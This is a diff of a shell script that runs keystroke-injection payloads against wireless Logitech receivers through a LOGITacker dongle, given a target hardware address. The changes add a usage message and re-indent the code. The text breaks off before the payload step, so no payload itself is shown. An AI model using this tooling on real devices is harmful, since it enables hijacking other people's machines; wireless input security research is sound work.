@@ -1,28 +1,38 @@
 #!/bin/ksh
 #set -x
 
+usage () {
+  echo ""
+  echo "Usage:"
+  echo "./generate_script_for_target_injection.ksh <LOGI_HW_ADDR>"
+  echo "Example: ./generate_script_for_target_injection.ksh AA:BB:CC:DD:EE"
+  echo ""
+  exit 1
+}
+
 # check for /dev/ttyACM0
 check_for_ACM0=$(ls -l /dev/ttyACM0)
 if [[ -z $check_for_ACM0 ]]; then
-echo "Can't execute payload because dongle is not present on /dev/ttyACM0"
-exit 1
+  echo "Can't execute payload because dongle is not present on /dev/ttyACM0"
+  exit 1
 fi
 
 if [[ -z $1 ]]; then
-echo "No argument passed."
-echo "Exiting."
-exit 1
+  echo "No argument passed."
+  echo "Target device address is needed."
+  echo "Exiting."
+  usage
 fi
 
 # clean up LOGITacker screen session just in case
 get_pid_of_LOGITacker_screen=$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print $1}' | awk '{$1=$1;print}')
 if [[ ! -z $get_pid_of_LOGITacker_screen ]]; then
-kill $get_pid_of_LOGITacker_screen
+  kill $get_pid_of_LOGITacker_screen
 fi
 
 # run this script to attach to /dev/ttyACM0 via screen in Linux and execute the payload
 if [[ $1 = "AA:BB:CC:DD:EE" ]]; then
-echo "Test mode."
+  echo "Test mode."
 else
 # small delays with python for reliability
 # no delays result in unreliable execution
